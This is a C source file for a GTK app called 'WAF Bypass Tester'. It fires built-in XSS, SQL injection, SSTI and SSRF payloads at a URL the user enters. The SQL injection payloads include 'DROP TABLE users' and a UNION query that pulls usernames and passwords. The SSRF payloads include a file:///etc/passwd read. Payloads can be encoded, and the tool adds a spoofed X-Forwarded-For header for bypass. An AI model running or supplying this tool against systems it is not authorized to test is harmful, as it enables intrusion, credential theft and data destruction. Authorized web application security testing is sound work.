#include <gtk/gtk.h>
#include <webkit2/webkit2.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

typedef struct {
    GtkWidget* window;
    GtkWidget* url_entry;
    GtkWidget* payload_combo;
    GtkWidget* encoding_combo;
    GtkWidget* result_text;
    GtkTextBuffer* result_buffer;
} WAFTesterUI;

// Payload definitions
static const char* XSS_PAYLOADS[] = {
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    NULL
};

static const char* SQLI_PAYLOADS[] = {
    "1' OR '1'='1",
    "1; DROP TABLE users--",
    "1 UNION SELECT username,password FROM users--",
    NULL
};

static const char* SSTI_PAYLOADS[] = {
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    NULL
};

static const char* SSRF_PAYLOADS[] = {
    "http://127.0.0.1:80",
    "http://localhost:80",
    "file:///etc/passwd",
    NULL
};

// Encoding functions
static char* url_encode(const char* str) {
    CURL* curl = curl_easy_init();
    char* encoded = curl_easy_escape(curl, str, 0);
    char* result = g_strdup(encoded);
    curl_free(encoded);
    curl_easy_cleanup(curl);
    return result;
}

static char* base64_encode(const char* str) {
    gsize out_len;
    char* encoded = g_base64_encode((const guchar*)str, strlen(str));
    return encoded;
}

static char* hex_encode(const char* str) {
    size_t len = strlen(str);
    char* result = g_malloc(len * 2 + 1);
    for(size_t i = 0; i < len; i++) {
        sprintf(result + (i * 2), "%02x", (unsigned char)str[i]);
    }
    return result;
}

// HTTP request callback
static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    GString* response = (GString*)userp;
    g_string_append_len(response, contents, size * nmemb);
    return size * nmemb;
}

// Test payload against target
static void test_payload(const char* url, const char* payload, const char* encoding, GtkTextBuffer* result_buffer) {
    CURL* curl;
    CURLcode res;
    GString* response = g_string_new(NULL);
    char* encoded_payload = NULL;
    
    // Apply encoding
    if(g_strcmp0(encoding, "URL Encode") == 0) {
        encoded_payload = url_encode(payload);
    }
    else if(g_strcmp0(encoding, "Base64") == 0) {
        encoded_payload = base64_encode(payload);
    }
    else if(g_strcmp0(encoding, "Hex") == 0) {
        encoded_payload = hex_encode(payload);
    }
    else {
        encoded_payload = g_strdup(payload);
    }
    
    // Construct test URL
    char* test_url = g_strdup_printf("%s/%s", url, encoded_payload);
    
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, test_url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
        
        // Add custom headers for WAF bypass
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "X-Forwarded-For: 127.0.0.1");
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        res = curl_easy_perform(curl);
        
        GString* result = g_string_new(NULL);
        g_string_append_printf(result, "Testing: %s\n", test_url);
        g_string_append_printf(result, "Encoded payload: %s\n", encoded_payload);
        
        if(res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            g_string_append_printf(result, "Response code: %ld\n", response_code);
            
            if(response_code == 200) {
                g_string_append(result, "Status: POTENTIAL BYPASS SUCCESS\n");
                if(g_strstr_len(response->str, -1, payload)) {
                    g_string_append(result, "Payload found in response - WAF potentially bypassed!\n");
                }
            }
            else if(response_code == 403 || response_code == 406) {
                g_string_append(result, "Status: BLOCKED BY WAF\n");
            }
        }
        else {
            g_string_append_printf(result, "Test failed: %s\n", curl_easy_strerror(res));
        }
        
        g_string_append(result, "\n-------------------\n\n");
        
        GtkTextIter iter;
        gtk_text_buffer_get_end_iter(result_buffer, &iter);
        gtk_text_buffer_insert(result_buffer, &iter, result->str, -1);
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        g_string_free(result, TRUE);
    }
    
    g_free(encoded_payload);
    g_free(test_url);
    g_string_free(response, TRUE);
}

static void on_test_clicked(GtkButton* button, WAFTesterUI* ui) {
    const char* url = gtk_entry_get_text(GTK_ENTRY(ui->url_entry));
    const char* payload_type = gtk_combo_box_text_get_active_text(GTK_COMBO_BOX_TEXT(ui->payload_combo));
    const char* encoding = gtk_combo_box_text_get_active_text(GTK_COMBO_BOX_TEXT(ui->encoding_combo));
    
    gtk_text_buffer_set_text(ui->result_buffer, "", -1);
    
    const char** payloads = NULL;
    if(g_strcmp0(payload_type, "XSS") == 0) payloads = XSS_PAYLOADS;
    else if(g_strcmp0(payload_type, "SQL Injection") == 0) payloads = SQLI_PAYLOADS;
    else if(g_strcmp0(payload_type, "SSTI") == 0) payloads = SSTI_PAYLOADS;
    else if(g_strcmp0(payload_type, "SSRF") == 0) payloads = SSRF_PAYLOADS;
    
    if(payloads) {
        for(int i = 0; payloads[i] != NULL; i++) {
            test_payload(url, payloads[i], encoding, ui->result_buffer);
        }
    }
}

static void activate_waf_tester(GtkApplication* app, gpointer user_data) {
    WAFTesterUI* ui = g_new0(WAFTesterUI, 1);
    
    ui->window = gtk_application_window_new(app);
    gtk_window_set_title(GTK_WINDOW(ui->window), "WAF Bypass Tester");
    gtk_window_set_default_size(GTK_WINDOW(ui->window), 800, 600);
    
    GtkWidget* grid = gtk_grid_new();
    gtk_container_add(GTK_CONTAINER(ui->window), grid);
    
    // URL Entry
    GtkWidget* url_label = gtk_label_new("Target URL:");
    ui->url_entry = gtk_entry_new();
    gtk_entry_set_text(GTK_ENTRY(ui->url_entry), "http://example.com");
    
    // Payload Type Combo
    GtkWidget* payload_label = gtk_label_new("Payload Type:");
    ui->payload_combo = gtk_combo_box_text_new();
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(ui->payload_combo), "XSS");
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(ui->payload_combo), "SQL Injection");
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(ui->payload_combo), "SSTI");
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(ui->payload_combo), "SSRF");
    gtk_combo_box_set_active(GTK_COMBO_BOX(ui->payload_combo), 0);
    
    // Encoding Combo
    GtkWidget* encoding_label = gtk_label_new("Encoding:");
    ui->encoding_combo = gtk_combo_box_text_new();
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(ui->encoding_combo), "None");
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(ui->encoding_combo), "URL Encode");
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(ui->encoding_combo), "Base64");
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(ui->encoding_combo), "Hex");
    gtk_combo_box_set_active(GTK_COMBO_BOX(ui->encoding_combo), 0);
    
    // Test Button
    GtkWidget* test_button = gtk_button_new_with_label("Test WAF");
    g_signal_connect(test_button, "clicked", G_CALLBACK(on_test_clicked), ui);
    
    // Results View
    GtkWidget* scroll = gtk_scrolled_window_new(NULL, NULL);
    ui->result_text = gtk_text_view_new();
    ui->result_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ui->result_text));
    gtk_container_add(GTK_CONTAINER(scroll), ui->result_text);
    
    // Layout
    gtk_grid_attach(GTK_GRID(grid), url_label, 0, 0, 1, 1);
    gtk_grid_attach(GTK_GRID(grid), ui->url_entry, 1, 0, 2, 1);
    gtk_grid_attach(GTK_GRID(grid), payload_label, 0, 1, 1, 1);
    gtk_grid_attach(GTK_GRID(grid), ui->payload_combo, 1, 1, 2, 1);
    gtk_grid_attach(GTK_GRID(grid), encoding_label, 0, 2, 1, 1);
    gtk_grid_attach(GTK_GRID(grid), ui->encoding_combo, 1, 2, 2, 1);
    gtk_grid_attach(GTK_GRID(grid), test_button, 0, 3, 3, 1);
    gtk_grid_attach(GTK_GRID(grid), scroll, 0, 4, 3, 1);
    
    gtk_widget_set_hexpand(ui->url_entry, TRUE);
    gtk_widget_set_hexpand(scroll, TRUE);
    gtk_widget_set_vexpand(scroll, TRUE);
    
    gtk_widget_show_all(ui->window);
}

int main(int argc, char** argv) {
    GtkApplication* app = gtk_application_new("org.gtk.waftester", G_APPLICATION_FLAGS_NONE);
    g_signal_connect(app, "activate", G_CALLBACK(activate_waf_tester), NULL);
    int status = g_application_run(G_APPLICATION(app), argc, argv);
    g_object_unref(app);
    return status;
}